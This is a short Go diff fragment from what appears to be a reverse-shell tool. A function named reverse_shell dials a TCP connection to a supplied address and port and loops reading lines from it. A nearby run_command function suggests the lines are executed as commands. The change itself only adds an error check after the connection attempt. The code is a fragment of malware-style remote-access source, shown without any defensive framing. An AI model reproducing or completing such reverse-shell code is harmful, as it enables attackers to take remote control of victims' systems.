@@ -90,6 +90,9 @@ func run_command(command string){
 func reverse_shell(address string, port string){
 	conn, err := net.Dial("tcp", address+":"+port)
 
+	if err != nil {
+		return
+	}
 	for {
  
 	   message, err := bufio.NewReader(conn).ReadString('\n')
